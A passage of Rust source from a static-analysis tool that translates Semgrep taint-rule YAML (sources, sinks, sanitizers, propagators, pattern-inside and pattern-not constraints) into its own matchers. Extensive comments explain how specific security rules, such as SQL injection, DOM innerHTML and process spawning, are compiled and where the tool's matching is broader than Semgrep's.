/// [`Propagator`](crate::rules::taint_engine::Propagator) subset.
///
/// Each entry is a mapping `{ pattern, from, to, ... }`. We recognize the
/// method-call shape `<receiver>.<method>(<args>)` where the `to` metavariable
/// appears in the receiver and the `from` metavariable appears in the argument
/// list — i.e. an argument taints the receiver. The receiver's declared type
/// (`(StringBuilder $SB)`) is intentionally dropped (over-approximating, but a
/// propagator only ever *adds* taint that must still reach a sink). Any entry
/// that does not match this shape (argument→argument, receiver→argument, or a
/// non-call form such as `$VAR += $FROM`) is dropped with a warning.
fn compile_propagators(
    node: Option<&YamlValue>,
    rule_id: &str,
) -> Vec<crate::rules::taint_engine::Propagator> {
    let Some(node) = node else {
        return Vec::new();
    };
    let Some(seq) = node.as_sequence() else {
        eprintln!(
            "Warning: taint rule `{}` `pattern-propagators` must be a list; ignoring",
            rule_id
        );
        return Vec::new();
    };
    let mut out = Vec::new();
    for entry in seq {
        let pattern = entry.get("pattern").and_then(YamlValue::as_str);
        let from = entry.get("from").and_then(YamlValue::as_str);
        let to = entry.get("to").and_then(YamlValue::as_str);
        let (Some(pattern), Some(from), Some(to)) = (pattern, from, to) else {
            eprintln!(
                "Warning: taint rule `{}` propagator entry is missing `pattern`/`from`/`to`; skipping",
                rule_id
            );
            continue;
        };
        match parse_arg_to_receiver_propagator(pattern, from, to) {
            Some(p) => out.push(p),
            None => eprintln!(
                "Warning: taint rule `{}` propagator `{}` (from `{}` to `{}`) is not a supported \
                 argument→receiver method-call shape; deferred (potential false negative)",
                rule_id, pattern, from, to
            ),
        }
    }
    out
}

/// Parse a propagator pattern of the argument→receiver method-call form
/// `<receiver>.<method>(<args>)`, returning a
/// [`Propagator`](crate::rules::taint_engine::Propagator) when the `to`
/// metavariable is in the receiver and the `from` metavariable is in the
/// argument list. `method` is `Some(name)` for a concrete method identifier and
/// `None` for a metavariable method (`$ANY`).
fn parse_arg_to_receiver_propagator(
    pattern: &str,
    from_mv: &str,
    to_mv: &str,
) -> Option<crate::rules::taint_engine::Propagator> {
    let pat = pattern.trim();
    if !pat.ends_with(')') {
        return None;
    }
    // Find the `(` that opens the outermost (final) argument list by scanning
    // back from the trailing `)` with paren-depth tracking.
    let bytes = pat.as_bytes();
    let mut depth = 0i32;
    let mut open_idx = None;
    for i in (0..bytes.len()).rev() {
        match bytes[i] {
            b')' => depth += 1,
            b'(' => {
                depth -= 1;
                if depth == 0 {
                    open_idx = Some(i);
                    break;
                }
            }
            _ => {}
        }
    }
    let open_idx = open_idx?;
    let head = pat[..open_idx].trim_end();
    let args = &pat[open_idx + 1..pat.len() - 1];

    // `head` must be `<receiver>.<method>` with a top-level `.` (a bare
    // `func($FROM)` call has no receiver and cannot propagate to one).
    let dot = last_top_level_dot(head)?;
    let receiver = head[..dot].trim();
    let method = head[dot + 1..].trim();
    if receiver.is_empty() || method.is_empty() {
        return None;
    }

    // Direction check: `to` in the receiver, `from` in the argument list.
    if !mentions_metavar(receiver, to_mv) {
        return None;
    }
    if !mentions_metavar(args, from_mv) {
        return None;
    }

    let method = if method.starts_with('$') {
        // Metavariable method (`$ANY`) → match any method name.
        None
    } else if is_plain_ident(method) {
        Some(method.to_string())
    } else {
        return None;
    };

    let description = match &method {
        Some(m) => format!("`.{m}(...)` argument taints receiver"),
        None => "method-call argument taints receiver".to_string(),
    };
    Some(crate::rules::taint_engine::Propagator {
        method,
        description,
    })
}

/// Find the byte offset of the last `.` in `s` that is not nested inside any
/// `()` or `[]` (so the `.` inside a typed-receiver cast like
/// `(StringBuilder $SB)` is ignored). Returns `None` when there is no
/// top-level `.`.
fn last_top_level_dot(s: &str) -> Option<usize> {
    let mut depth = 0i32;
    let mut last = None;
    for (i, b) in s.bytes().enumerate() {
        match b {
            b'(' | b'[' => depth += 1,
            b')' | b']' => depth -= 1,
            b'.' if depth == 0 => last = Some(i),
            _ => {}
        }
    }
    last
}

/// True when `mv` (a Semgrep metavariable such as `$X`, `$SB`, or a variadic
/// `$...TAINTED`) appears in `haystack` as a whole token — i.e. it is not
/// immediately followed by another identifier character. The trailing-boundary
/// check prevents `$S` from matching inside `$STR`.
fn mentions_metavar(haystack: &str, mv: &str) -> bool {
    let mv = mv.trim();
    if mv.is_empty() {
        return false;
    }
    let hay = haystack.as_bytes();
    let mut search_from = 0;
    while let Some(rel) = haystack[search_from..].find(mv) {
        let start = search_from + rel;
        let end = start + mv.len();
        let boundary_ok = hay.get(end).is_none_or(|b| !is_ident_byte(*b));
        if boundary_ok {
            return true;
        }
        search_from = start + 1;
        if search_from >= haystack.len() {
            break;
        }
    }
    false
}

fn is_ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// True when `s` is a plain method identifier (first char a letter or `_`,
/// remaining chars alphanumeric or `_`).
fn is_plain_ident(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Compile a list of raw `pattern-not` pattern strings (lifted from a
/// `patterns:` AND-block of the given role) into SEARCH-mode AST patterns,
/// warning-and-skipping any that do not parse into a usable pattern node.
fn compile_negative_patterns(
    patterns: &[String],
    lang: Language,
    rule_id: &str,
    role_label: &str,
) -> Vec<crate::rules::semgrep_compat::CompiledAstPattern> {
    let mut out = Vec::new();
    for p in patterns {
        match crate::rules::semgrep_compat::CompiledAstPattern::try_new(p, lang) {
            Some(compiled) => out.push(compiled),
            None => eprintln!(
                "Warning: taint rule `{}` {} `pattern-not: {}` did not parse into \
                 a usable pattern; ignoring constraint (matcher stays broader)",
                rule_id, role_label, p
            ),
        }
    }
    out
}

/// Compile a list of raw `pattern-inside` pattern strings (lifted from a
/// `patterns:` AND-block of the given role) into SEARCH-mode AST patterns,
/// warning-and-skipping any that do not parse into a usable pattern node.
/// Compiled through the same path as `pattern-not` and positive search-mode
/// `pattern-inside` so grammar/metavariable handling agrees across modes.
fn compile_inside_patterns(
    patterns: &[String],
    lang: Language,
    rule_id: &str,
    role_label: &str,
) -> Vec<crate::rules::semgrep_compat::CompiledAstPattern> {
    let mut out = Vec::new();
    for p in patterns {
        match crate::rules::semgrep_compat::CompiledAstPattern::try_new(p, lang) {
            Some(compiled) => out.push(compiled),
            None => eprintln!(
                "Warning: taint rule `{}` {} `pattern-inside: {}` did not parse into \
                 a usable pattern; ignoring constraint (matcher stays broader)",
                rule_id, role_label, p
            ),
        }
    }
    out
}

#[derive(Copy, Clone)]
enum MatcherRole {
    Source,
    Sink,
    Sanitizer,
}

impl MatcherRole {
    fn label(self) -> &'static str {
        match self {
            MatcherRole::Source => "pattern-sources",
            MatcherRole::Sink => "pattern-sinks",
            MatcherRole::Sanitizer => "pattern-sanitizers",
        }
    }
}

/// Compile a top-level `pattern-sources` / `pattern-sinks` /
/// `pattern-sanitizers` list.
///
/// Each entry is allowed to be either:
///
/// - a mapping with a single `pattern:` key (compiled to one [`NodeMatcher`]),
/// - a mapping with a single `pattern-either:` key whose value is itself a
///   list of entries following the same rules (flattened recursively into
///   multiple matchers).
///
/// Any other key (`patterns:`, `pattern-inside:`, `metavariable-pattern:`,
/// …) is rejected with a warning that names the rule and the offending key,
/// and the individual entry is skipped. If the role ends up with *no* valid
/// entries the caller decides whether that is fatal for the whole rule
/// (sources and sinks are required; sanitizers may legitimately be empty).
///
/// Returns the compiled matchers and, separately, the raw `pattern-not` and
/// `pattern-inside` pattern strings lifted out of any `patterns:` AND-blocks
/// in this list (keyed by `role` so the caller knows where to enforce them).
/// The constraints are compiled to AST patterns later by the caller —
/// collecting them here keeps `compile_entry` / `compile_patterns_block`
/// focused on the expressible-matcher side.
// Returns (expressible matchers, dropped `pattern-not` strings, dropped
// `pattern-inside` strings). The three parallel Vecs are clearer inline than
// behind a named struct for this single internal compile helper.
#[allow(clippy::type_complexity)]
fn compile_matcher_list(
    node: Option<&YamlValue>,
    role: MatcherRole,
    rule_id: &str,
    lang: Language,
    labels_enabled: bool,
) -> Result<(Vec<GenericMatcher>, Vec<String>, Vec<String>), String> {
    let Some(node) = node else {
        return Ok((Vec::new(), Vec::new(), Vec::new()));
    };
    let Some(entries) = node.as_sequence() else {
        return Err(format!("{} must be a list", role.label()));
    };

    let mut out = Vec::new();
    let mut negatives: Vec<String> = Vec::new();
    let mut insides: Vec<String> = Vec::new();
    for entry in entries {
        compile_entry(
            entry,
            role,
            rule_id,
            lang,
            labels_enabled,
            &mut out,
            &mut negatives,
            &mut insides,
        );
    }
    Ok((out, negatives, insides))
}

/// Compile a single entry from a source/sink/sanitizer list, flattening
/// nested `pattern-either:` blocks, and extracting expressible matchers from
/// `patterns:` AND-blocks. Invalid entries emit a warning and are skipped
/// rather than aborting the whole rule.
///
/// `negatives` accumulates the raw `pattern-not` pattern strings and
/// `insides` the raw `pattern-inside` pattern strings lifted from `patterns:`
/// AND-blocks so the caller can compile and enforce them; every other
/// constraint key is still dropped with a warning.
#[allow(clippy::too_many_arguments)]
fn compile_entry(
    entry: &YamlValue,
    role: MatcherRole,
    rule_id: &str,
    lang: Language,
    labels_enabled: bool,
    out: &mut Vec<GenericMatcher>,
    negatives: &mut Vec<String>,
    insides: &mut Vec<String>,
) {
    let Some(map) = entry.as_mapping() else {
        eprintln!(
            "Warning: taint rule `{}` {} entry is not a mapping; skipping",
            rule_id,
            role.label()
        );
        return;
    };

    // Taint-labels: for a rule whose `label:`/`requires:` shape is the tractable
    // `CONCAT` family ([`detect_label_policy`]), a SOURCE entry that carries a
    // `requires:` is the conditional-relabel source (e.g. the `$X + $INPUT`
    // concat shapes with `label: CONCAT, requires: INPUT`). Its behavior is
    // captured entirely by the [`LabelPolicy`]'s string-building relabel, so we
    // do NOT compile it to a matcher — compiling `String.format(...)` etc. as a
    // literal SOURCE matcher would wrongly seed those calls as taint origins.
    if labels_enabled {
        if let MatcherRole::Source = role {
            if map.get(YamlValue::from("requires")).is_some() {
                return;
            }
        }
    }

    // `by-side-effect:` is a Semgrep taint-source flag (the *side-effect* of the
    // matched expression is the source, not its value). The compiled matcher
    // shape is the same either way, so we treat the flag as a no-op marker and
    // compile the companion `pattern:`/`patterns:`/`pattern-either:` key. Drop
    // the flag from the key count so an entry like
    // `{ by-side-effect: true, pattern: ... }` is not mis-rejected as multi-key.
    //
    // `label:` / `requires:` are the taint-labels keys. When a `LabelPolicy` is
    // active they are consumed by the policy, so drop them from the key count
    // too (the companion `pattern:`/`patterns:` still compiles) — otherwise a
    // labeled entry looks multi-key and is wrongly rejected.
    let effective_keys: Vec<(&YamlValue, &YamlValue)> = map
        .iter()
        .filter(|(k, _)| {
            let key = k.as_str();
            if key == Some("by-side-effect") {
                return false;
            }
            if labels_enabled && matches!(key, Some("label") | Some("requires")) {
                return false;
            }
            true
        })
        .collect();

    // Entries are expected to carry exactly one top-level key (after dropping
    // the `by-side-effect` flag). Having more than one suggests the user meant
    // `patterns:` semantics, which we don't support inside taint blocks — warn
    // and skip.
    if effective_keys.len() != 1 {
        eprintln!(
            "Warning: taint rule `{}` {} entry has {} keys (expected a single `pattern:`, `pattern-either:`, or `patterns:`); skipping entry",
            rule_id,
            role.label(),
            effective_keys.len(),
        );
        return;
    }

    let (k, v) = effective_keys[0];
    match k.as_str() {
        Some("pattern") => {
            let Some(pattern) = v.as_str() else {
                eprintln!(
                    "Warning: taint rule `{}` {} `pattern:` value must be a string; skipping entry",
                    rule_id,
                    role.label()
                );
                return;
            };
            match compile_pattern(pattern, role, lang) {
                Some(m) => out.push(m),
                None => eprintln!(
                    "Warning: taint rule `{}` {} unsupported pattern shape `{}`; skipping entry",
                    rule_id,
                    role.label(),
                    pattern
                ),
            }
        }
        Some("pattern-either") => {
            let Some(inner) = v.as_sequence() else {
                eprintln!(
                    "Warning: taint rule `{}` {} `pattern-either:` must be a list; skipping",
                    rule_id,
                    role.label()
                );
                return;
            };
            if inner.is_empty() {
                eprintln!(
                    "Warning: taint rule `{}` {} `pattern-either:` is empty; producing no matchers",
                    rule_id,
                    role.label()
                );
                return;
            }
            for nested in inner {
                compile_entry(
                    nested,
                    role,
                    rule_id,
                    lang,
                    labels_enabled,
                    out,
                    negatives,
                    insides,
                );
            }
        }
        Some("patterns") => {
            // ── Parameter-as-source shape (focus-metavariable + a function-
            //    signature `pattern-inside`/`pattern`) ─────────────────────
            //
            // The dominant rejected taint-source shape is "a parameter of the
            // enclosing handler/function is user-controlled", written as
            //
            //   patterns:
            //     - pattern-inside: |
            //         function ... (..., $ARG, ...) { ... }
            //     - focus-metavariable: $ARG
            //
            // or the AWS-Lambda variant `pattern: $EVENT` + a
            // `pattern-either:` of `pattern-inside` handler signatures binding
            // `$EVENT` as a parameter. None of the generic node shapes express
            // this, so the block compiles to nothing and the rule is rejected.
            //
            // When the block is the parameter-as-source shape we compile it to
            // a single any-parameter wildcard source
            // (`ParamName { names: [ANY_PARAM_WILDCARD] }`); each engine seeds
            // every function parameter as tainted (see
            // `taint_engine::param_names_are_wildcard`). Only meaningful as a
            // SOURCE — a parameter is a taint origin, not a destination.
            // ── Decorated-parameter SOURCE shape (MCP handler) ──────────────
            //
            // The MCP rules name their source as a parameter of a function
            // DECORATED by `@$SERVER.tool()`:
            //
            //   patterns:
            //     - pattern: |
            //         @$SERVER.tool()
            //         def $FUNC(..., $PARAM, ...):
            //             ...
            //     - focus-metavariable: $PARAM
            //
            // The plain any-parameter wildcard would DROP the decorator gate and
            // seed every function's parameters (over-match). We compile this to a
            // `DecoratedParamSource { decorator }` so the engine seeds parameters
            // ONLY inside functions carrying a matching `<x>.tool(...)` decorator.
            // Tried before the generic param-source recogniser (whose signature
            // scan would stumble on the decorator's own `()` argument list).
            if let MatcherRole::Source = role {
                if try_compile_decorated_param_source_block(v, out) {
                    return;
                }
            }
            if let MatcherRole::Source = role {
                if try_compile_param_source_block(v, out) {
                    return;
                }
            }
            // ── Go `[]byte("$F")` byte-slice-literal SOURCE shape ───────────
            //
            // The `hardcoded-jwt-key` rule names its source as
            // `pattern-inside: []byte("$F")` — a hardcoded byte-slice key. None
            // of the generic shapes recognise a `pattern-inside`-only literal
            // source, so it would compile to nothing and skip. We compile it to
            // a `LiteralString` (seed every Go string literal); the specific
            // `.SignedString(...)` sink keeps it precise.
            if let MatcherRole::Source = role {
                if try_compile_go_bytes_literal_source_block(v, lang, out) {
                    return;
                }
            }
            // ── String-literal-matching-regex SOURCE shape ──────────────────
            //
            // The `requests` cleartext-transport family
            // (`request-with-http`, `request-session-with-http`,
            // `request-session-http-in-with-context`) expresses its source as a
            // string LITERAL whose *content* matches a regex:
            //
            //   patterns:
            //     - pattern: |
            //         "$URL"
            //     - metavariable-pattern:
            //         metavariable: $URL
            //         language: regex
            //         patterns:
            //           - pattern-regex: http://
            //           - pattern-not-regex: .*://localhost
            //           - pattern-not-regex: .*://127\.0\.0\.1
            //
            // i.e. "a literal that contains `http://` and is not localhost /
            // 127.0.0.1". We compile this to a `LiteralString { regex: Some(..) }`
            // source: the engine seeds ONLY string literals whose text matches
            // the combined regex, so `requests.request("GET", "http://evil")`
            // fires while `"https://safe"` / `"localhost"` / a non-literal
            // variable stays clean. Source role only — a literal is an origin.
            if let MatcherRole::Source = role {
                if try_compile_string_literal_regex_source_block(v, rule_id, out) {
                    return;
                }
            }
            // ── Focus-on-call-argument SOURCE shape (the source-side dual of the
            //    focus-on-call-argument SINK shape below) ──────────────────
            //
            // The C# `use_weak_rng_for_keygeneration` rule names a focused
            // metavariable that is an ARGUMENT of a call given by a
            // `pattern-inside` context:
            //
            //   patterns:
            //     - pattern-inside: (System.Random $RNG).NextBytes($KEY); ...
            //     - pattern: $KEY
            //
            // Semgrep means "the value written into the focused argument of this
            // call is the taint source" — the buffer a weak RNG's `NextBytes`
            // fills becomes untrusted key material. None of the generic source
            // shapes express this (a bare `pattern: $KEY` is not a usable
            // source), so the block compiles to nothing and the rule is rejected.
            // We compile a `CallArgSource { method, arg_index }`; the C# engine
            // seeds the identifier in that argument position of a matching call.
            // Source role only — a call-argument fill is a taint origin.
            if let MatcherRole::Source = role {
                if try_compile_focus_call_source_block(v, out) {
                    return;
                }
            }
            // ── Receiver-provenance SOURCE shape (Java `md5-used-as-password`) ─
            //
            // A `pattern-inside` binding a metavariable `$MD` to an initializer
            // call `MessageDigest.getInstance("MD5")`, paired with a
            // `pattern: $MD.digest(...)`. Semgrep means "the `.digest()` output
            // of an MD5-initialized MessageDigest is the source". The generic
            // shapes cannot express the receiver-provenance link, so the block
            // otherwise compiles to nothing and the rule is rejected. We compile
            // a `ReceiverProvenanceCall`; the Java engine fires the source only
            // on a `.digest()` call whose receiver's in-scope initializer
            // matches (the `"MD5"` literal is the discriminator). Java + source.
            if let MatcherRole::Source = role {
                if lang == Language::Java && try_compile_receiver_provenance_source_block(v, out) {
                    return;
                }
            }
            // ── Focus-on-call-argument SINK shape (the sink-side analog of the
            //    parameter-as-source shape) ──────────────────
            //
            // A common rejected sink shape names a focused metavariable that is
            // an ARGUMENT of a call given by a `pattern-inside`/`pattern`
            // context, e.g.
            //
            //   patterns:
            //     - pattern-inside: redirect_to $X, ...
            //     - pattern: $X
            //
            //   patterns:
            //     - pattern: $RES.$METH($QUERY, ...)
            //     - metavariable-regex: { metavariable: $METH, regex: ^(sendFile)$ }
            //     - focus-metavariable: $QUERY
            //
            // Semgrep means "the focused argument, when it appears inside this
            // call, is a sink". The dropped-constraint fallback empties the sink
            // role (no bare metavar is a usable sink), rejecting the rule. We
            // compile the call context to the existing `Call`/`MethodName` sink
            // matcher (which already fires only when a tainted value reaches the
            // call's arguments), gated by the method-name `metavariable-regex`
            // where present. Sink/sanitizer only — a call argument is a data-flow
            // destination, not a taint origin.
            // ── Positional-argument SINK shape (Java
            //    `tainted-session-from-http-request`) ──────────────────────────
            //
            // `request.getSession().$FUNC($NAME, $VALUE)` + a `$FUNC`
            // `metavariable-regex` alternation + `focus-metavariable: $VALUE`.
            // Semgrep means "only a tainted VALUE at the focused position is the
            // sink" — a tainted KEY must NOT fire. The generic any-argument focus
            // recognizer below would drop the positional constraint (broadening),
            // so we claim it first and compile a positionally-precise
            // `MethodArgSink`. Gated to Java (the only rule with this shape) +
            // sink/sanitizer.
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if lang == Language::Java && try_compile_method_arg_sink_block(v, role, out) {
                    return;
                }
            }
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if try_compile_focus_call_sink_block(v, role, lang, out) {
                    return;
                }
            }
            // ── Tainted CLASS-NAME instantiation SINK shape (PHP) ────────────
            //
            // The `tainted-object-instantiation` rule (unsafe reflection) binds
            // its sink to the CLASS-NAME selector of a `new`:
            //
            //   patterns:
            //     - pattern-either:
            //         - pattern-inside: new $SINK(...)
            //     - pattern: $SINK
            //
            // i.e. "the focused metavariable `$SINK`, when it is the class name of
            // a `new $SINK(...)`, is the sink". This is NOT a constructor-argument
            // sink: the taint is the callee/class-name position. The focus-call
            // recognizer above requires the focused metavariable to be an
            // ARGUMENT of the call, so it (correctly) does not claim this block —
            // `new $SINK(...)` has no `$SINK` argument. We compile a dedicated
            // `TaintedCallee` sink; the PHP engine fires only when the class-name
            // operand of an `object_creation_expression` carries taint. Gated to
            // PHP + sink/sanitizer.
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if lang == Language::Php && try_compile_tainted_callee_sink_block(v, role, out) {
                    return;
                }
            }
            // ── Tainted SUBSCRIPT-KEY assignment SINK shape (PHP) ────────────
            //
            // The `tainted-session` rule (session poisoning) binds its sink to
            // the KEY / index of a superglobal assignment target:
            //
            //   patterns:
            //     - pattern-inside: $_SESSION[$KEY] = $VAL;
            //     - pattern: $KEY
            //
            // i.e. "the focused metavariable `$KEY`, when it is the index of a
            // `$_SESSION[$KEY] = …` write, is the sink". This is NOT a
            // tainted-value sink: the taint is the subscript KEY of an
            // assignment TARGET. We compile a dedicated `TaintedSubscriptKey`
            // sink (recording the superglobal base); the PHP engine fires only
            // when the key operand of an assignment-LHS `subscript_expression`
            // carries taint. Gated to PHP + sink/sanitizer.
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if lang == Language::Php && try_compile_subscript_key_sink_block(v, role, out) {
                    return;
                }
            }
            // ── Ruby metavariable-pattern-ENUMERATED call SINK shape ────────
            //
            // A `patterns:` AND-block pairing a single-metavariable callee
            // (`Net::HTTP.$X(...)`, `Net::HTTP::$METHOD.new(...)`) with a
            // `metavariable-pattern` that enumerates that metavariable into a
            // fixed set of literal method/constant names (the
            // `avoid-tainted-http-request` sink shape). We ENUMERATE the
            // alternation and compile one concrete `Call { canonical }` per
            // listed name (receiver AND method fixed) — strictly ≤ what Semgrep
            // matches. Gated to Ruby + sink/sanitizer.
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if lang == Language::Ruby
                    && try_compile_ruby_metavar_pattern_enum_call_block(v, role, out)
                {
                    return;
                }
            }
            // ── Regex-bounded bare-metavar callee SINK shape ────────────────
            //
            // A `patterns:` AND-block that pairs a bare-metavariable callee
            // pattern with a `metavariable-regex` pinning that metavariable,
            // e.g.
            //
            //   patterns:
            //     - pattern: $EXEC(...)
            //     - metavariable-regex: { metavariable: $EXEC, regex: ^(system|exec)$ }
            //
            //   patterns:
            //     - pattern: $WRITER.$WRITE(...)
            //     - metavariable-regex: { metavariable: $WRITE, regex: ^(writerow)$ }
            //
            // Without the `metavariable-regex` a bare-metavar callee would
            // match every call (universal → FP) and is refused. WITH the pin
            // the match is bounded to callees whose name matches the regex, so
            // we compile a name-constrained `CallRegex`/`MethodNameRegex`
            // matcher that enforces the regex at match time. Sink/sanitizer
            // only — a call argument is a data-flow destination, not an origin.
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if try_compile_regex_constrained_callee_block(v, role, rule_id, out) {
                    return;
                }
            }
            // ── Regex-bounded metavariable-RECEIVER SINK shape ──────────────
            //
            // The receiver-side analogue of the regex-bounded callee shape: a
            // `patterns:` AND-block that pairs a metavariable-receiver call with
            // a CONCRETE method (`$OBJ.method(...)`) and a `metavariable-regex`
            // whose anchored alternation pins the *receiver* metavariable, e.g.
            //
            //   patterns:
            //     - pattern: $CONN.execute(...)
            //     - metavariable-regex: { metavariable: $CONN, regex: ^(db|conn)$ }
            //
            // Without the pin, `$OBJ.method(...)` compiles (via the normal
            // pattern path) to a receiver-agnostic `MethodName { method }` sink
            // that fires on EVERY `*.method(...)` call, and the receiver
            // `metavariable-regex` is dropped — a documented broadening / FP.
            // WITH an anchored-alternation pin we enumerate one concrete
            // `Call { canonical: "<recv>.method" }` per listed receiver, so only
            // calls whose receiver is a named identifier fire. Sink/sanitizer
            // only — a call argument is a destination, not an origin.
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if try_compile_regex_constrained_receiver_block(v, role, out) {
                    return;
                }
            }
            // ── Composed focus + `pattern-either`-of-regex-pinned-method-calls
            //    SINK shape ───────────────────────────────────────────────────
            //
            // The `dangerous-spawn-process` sink family: a shared
            // `focus-metavariable: $CMD` (or a per-arm bare `pattern: $CMD`) over
            // a `pattern-either:` whose arms each name a call
            // `os.$METHOD($MODE, $CMD, ...)` with a `metavariable-regex` pinning
            // the callee's method metavariable `$METHOD`. None of the recognizers
            // above handle a CONCRETE-receiver + metavariable-METHOD callee
            // (`os.$METHOD`) — the normal pattern path compiles it to a
            // receiver-agnostic `ReceiverCall { "os" }` that would fire on EVERY
            // `os.X(...)`, dropping the `$METHOD` regex (over-match, refused). We
            // instead ENUMERATE the regex alternation and compile one concrete
            // `os.spawnv(...)`/… call per alternative (receiver AND method
            // enforced), which is strictly ≤ what Semgrep matches. Arms whose
            // `metavariable-regex` also pins a NON-callee metavariable (the
            // `$BASH` bash-wrapper arms) are DEFERRED — that constraint is
            // inexpressible and firing without it would over-match.
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if try_compile_focus_regex_either_sink_block(v, role, lang, out) {
                    return;
                }
            }
            // ── Composed `pattern-either` of two focus arms, both gated by a
            //    shared class-name / property-name `metavariable-regex` SINK
            //    shape (the C# `csharp-sqli` rule) ────────────────────────────
            //
            // A `pattern-either:` whose arms are `new $PATTERN($CMD,...)` (focus
            // `$CMD`, arg-position) and `$CMD.$PATTERN = $VALUE;` (focus
            // `$VALUE`, assignment RHS), both gated by a block-level
            // `metavariable-regex` pinning the CLASS-NAME / PROPERTY-NAME
            // metavariable `$PATTERN`. The pinned metavariable is neither a
            // callee nor the focus, so the callee/method/receiver-regex
            // recognizers above all miss it; the plain pattern path would drop
            // the regex and over-match (`new $ANY(...)` / any `$X.$Y = …`). We
            // ENUMERATE the anchored alternation and compile one enumerated
            // `ConstructorArgSink` / `PropertyAssignSink` per arm, so the C#
            // engine fires only on an enumerated class/property name with a
            // tainted focus argument/RHS — FP-safe. Gated to C#.
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if try_compile_csharp_pattern_regex_either_sink_block(v, role, lang, out) {
                    return;
                }
            }
            // ── JS DOM-property-assignment SINK with a metavariable property
            //    name pinned by an anchored-alternation `metavariable-regex`
            //    (the `react-unsanitized-property` rule) ─────────────────────
            //
            // The sink is `$BODY.$HTML = $SINK` (also the deep-member
            // `$BODY. ... .$HTML = $SINK` and the concrete-receiver
            // `ReactDOM.findDOMNode(...).$HTML = $SINK`) with a block-level
            // `metavariable-regex: { $HTML: (innerHTML|outerHTML) }` and
            // `focus-metavariable: $SINK`. The property being assigned is a
            // METAVARIABLE, so the plain [`parse_member_assign_pattern`] path
            // (which needs a concrete field) misses it and the block would
            // otherwise drop the regex + focus and produce nothing. We ENUMERATE
            // the anchored alternation into one concrete
            // [`GenericMatcher::MemberAssign`] per property name — the JS engine
            // then fires only on `<expr>.innerHTML = tainted` /
            // `<expr>.outerHTML = tainted` (never any other property, and never
            // a constant RHS). Gated to JS (the JS engine also serves TS).
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if try_compile_js_member_assign_regex_block(v, role, lang, out) {
                    return;
                }
            }
            // `patterns:` is a Semgrep AND-block: all sub-items must hold
            // simultaneously. foxguard's taint engine cannot express all AND
            // semantics (no nested scope / contextual constraints), so we
            // apply a graceful-degradation strategy:
            //
            // - Extract every `pattern:` and `pattern-either:` sub-item and
            //   compile them as expressible node-shape matchers.
            // - Capture `pattern-not:` sub-items into the `negatives`
            //   accumulator and `pattern-inside:` sub-items into the
            //   `insides` accumulator so the post-filter can ENFORCE them
            //   against the matched sink node (previously dropped, which
            //   broadened the matcher and caused false positives —
            //   pattern-inside made the rule fire everywhere instead of only
            //   inside the required region).
            // - Drop the remaining constraint-only sub-items
            //   (`pattern-not-inside:`, `focus-metavariable:`,
            //   `metavariable-*:`) with a per-key warning. This makes the
            //   compiled matcher slightly BROADER than the original Semgrep
            //   rule — documented in COMPATIBILITY.md — but only for those
            //   deferred keys.
            // - If no expressible matcher results, warn-skip the whole entry.
            compile_patterns_block(
                v,
                role,
                rule_id,
                lang,
                labels_enabled,
                out,
                negatives,
                insides,
            );
        }
        Some(other) => {
            eprintln!(
                "Warning: taint rule `{}` {} uses unsupported key `{}` (only `pattern:`, `pattern-either:`, and `patterns:` are supported); skipping entry",
                rule_id,
                role.label(),
                other
            );
        }
        None => {
            eprintln!(
                "Warning: taint rule `{}` {} entry has a non-string key; skipping",
                rule_id,
                role.label()
            );
        }
    }
}

/// The set of sub-item keys inside a `patterns:` block that are purely
/// constraint/narrowing operators — they refine the match scope but do not
/// themselves name a code node shape. The taint engine has no equivalent for
/// these (yet); they are dropped with a warning, making the compiled matcher
/// broader. `pattern-not` and `pattern-inside` are intentionally ABSENT from
/// this list: they are captured into the negatives/insides accumulators and
/// ENFORCED by the post-filter (containment precision), instead of dropped.
const PATTERNS_CONSTRAINT_KEYS: &[&str] = &[
    "pattern-not-inside",
    "pattern-not-regex",
    "focus-metavariable",
    "metavariable-regex",
    "metavariable-comparison",
    "metavariable-pattern",
    "metavariable-analysis",
    "metavariable-type",
];

/// Compile a `patterns:` AND-block value (the list under the `patterns:` key)
/// by extracting all expressible `pattern:` and `pattern-either:` sub-items.
/// `pattern-not:` sub-items are captured into `negatives` and `pattern-inside:`
/// sub-items into `insides` (both compiled and enforced later by the
/// post-filter). The remaining constraint-only sub-items are dropped with a
/// warning. If no expressible matcher is produced the whole entry is
/// warn-skipped.
#[allow(clippy::too_many_arguments)]
fn compile_patterns_block(
    v: &YamlValue,
    role: MatcherRole,
    rule_id: &str,
    lang: Language,
    labels_enabled: bool,
    out: &mut Vec<GenericMatcher>,
    negatives: &mut Vec<String>,
    insides: &mut Vec<String>,
) {
    let Some(inner) = v.as_sequence() else {
        eprintln!(
            "Warning: taint rule `{}` {} `patterns:` value must be a list; skipping entry",
            rule_id,
            role.label()
        );
        return;
    };

    if inner.is_empty() {
        eprintln!(
            "Warning: taint rule `{}` {} `patterns:` block is empty; skipping entry",
            rule_id,
            role.label()
        );
        return;
    }

    let before = out.len();

    for sub in inner {
        let Some(sub_map) = sub.as_mapping() else {
            continue;
        };
        if sub_map.len() != 1 {
            continue;
        }
        let (sk, sv) = sub_map.iter().next().expect("len == 1");
        match sk.as_str() {
            Some("pattern") | Some("pattern-either") => {
                // Recursively compile via the normal entry path.
                compile_entry(
                    sub,
                    role,
                    rule_id,
                    lang,
                    labels_enabled,
                    out,
                    negatives,
                    insides,
                );
            }
            Some("pattern-inside") => {
                // Capture the containment context. It is compiled to a
                // SEARCH-mode AST pattern by the caller and enforced against
                // the matched sink node in the post-filter: a finding is kept
                // only when its sink is textually inside a region matched by
                // this pattern, instead of being dropped (which broadened the
                // matcher — the rule fired everywhere rather than only inside
                // the required region).
                match sv.as_str() {
                    Some(p) if !p.trim().is_empty() => insides.push(p.to_string()),
